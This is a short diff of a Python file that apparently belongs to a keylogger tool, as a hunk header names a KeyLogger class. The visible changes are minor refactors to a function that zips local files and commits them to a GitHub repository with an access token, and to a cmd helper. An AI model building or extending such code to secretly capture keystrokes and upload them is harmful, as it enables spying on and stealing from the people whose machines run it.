@@ -96,9 +96,10 @@ def github_upload(token, repo, path):
     name = f'{dt.date()}_' \
            f'{s_time}_' \
            f'{os.path.split(path)[-1]}'
+    name = os.path.join(directory, name)
     zip_file = name + '.zip'
     if os.path.isdir(path):
-        shutil.make_archive(name, 'zip', path)
+        shutil.make_archive(base_name=name, format='zip', root_dir=path)
     elif os.path.exists(path):
         if not os.path.isdir(name):
             os.mkdir(name)
@@ -118,7 +119,7 @@ def github_upload(token, repo, path):
     base_tree = repo.get_git_tree(master_sha)
 
     data = base64.b64encode(open(zip_file, 'rb').read())
-    blob = repo.create_git_blob(data.decode('utf-8'), "base64")
+    blob = repo.create_git_blob(data.decode('utf-8'), 'base64')
     element = InputGitTreeElement(path=zip_file, mode='100644',
                                   type='blob', sha=blob.sha)
     tree = repo.create_git_tree([element], base_tree)
@@ -241,7 +242,7 @@ class KeyLogger:
 def cmd(s: str, directory='', v=False):
     global current_path, infoA, cursor_down
     if v:
-        return 8, 1
+        return 8, 2
 
     # ?
     variables = {
